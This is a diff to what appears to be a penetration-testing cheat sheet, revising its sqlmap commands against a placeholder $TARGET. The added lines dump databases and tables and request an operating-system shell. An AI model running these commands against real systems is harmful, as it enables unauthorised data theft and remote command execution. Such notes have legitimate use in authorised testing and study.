@@ -170,15 +170,14 @@ msfconsole
 #### sqlmap
 
 ```bash
-sqlmap -u $TARGET/index.php --data "user=1&password=1" --risk=3
+sqlmap --batch --forms --risk=3 --not-string="Incorrect" -u $TARGET --dbs
 
-sqlmap -u $TARGET/index.php --data "user=1&password=1" -o --batch --risk=3 --not-string="Incorrect credentials"
+sqlmap --batch --forms --risk=3 --level=2 --technique=BEUSQ --not-string="Incorrect" -u $TARGET --dbs
 
-... --dbs
+... -D db --dump
 ... -D db --tables
-... -D db -T users --columns
-... -D db -T users --dump
-
+... -D db -T table --dump
+... --os-shell
 ```
 
 Resources:
